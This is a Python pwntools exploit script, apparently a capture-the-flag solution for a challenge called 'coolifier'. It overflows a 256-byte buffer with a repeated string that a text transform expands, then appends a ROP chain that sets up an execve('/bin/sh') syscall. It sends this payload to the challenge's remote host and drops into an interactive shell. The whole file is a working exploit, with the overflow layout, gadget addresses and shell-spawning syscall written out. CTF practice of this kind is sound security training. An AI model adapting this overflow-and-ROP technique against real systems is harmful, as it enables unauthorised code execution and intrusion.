from pwn import *

# iamabear!     =>      9 byte
# \_ʕ•ᴥ•ʔ_/     =>      17 byte

# Array size: 256 byte

# Bufferoverflow:
# iamabear! * 15 + b"a" * 9 + ROPchain

# Syscall execve: 
#   rax = 0x3b
#   rdi = *file
#   rsi = 0x00
#   rdx = 0x00

ropchain  = p64(0x004011a6)     # pop rdi ; add rdi, 8 ; ret
ropchain += p64(0x004020bd - 8) # /bin/sh in emojis
ropchain += p64(0x004011b4)     # pop rdx ; xor rdx, 0x37 ; ret
ropchain += p64(0x37)
ropchain += p64(0x004011af)     # pop rsi ; ret
ropchain += p64(0x00)
ropchain += p64(0x004011bd)     # pop rax ; sub rax, 0x37 ; ret
ropchain += p64(0x3b + 0x37)
ropchain += p64(0x004011c6)     # syscall

payload = b"iamabear!" * 15
payload += b"a" * 9
payload += ropchain

r = remote("coolifier.challs.olicyber.it", 38068)

r.sendlineafter(b"length: ", str(len(payload)).encode())
r.sendafter(b"Message: ", payload)
r.recv(1000)

r.interactive()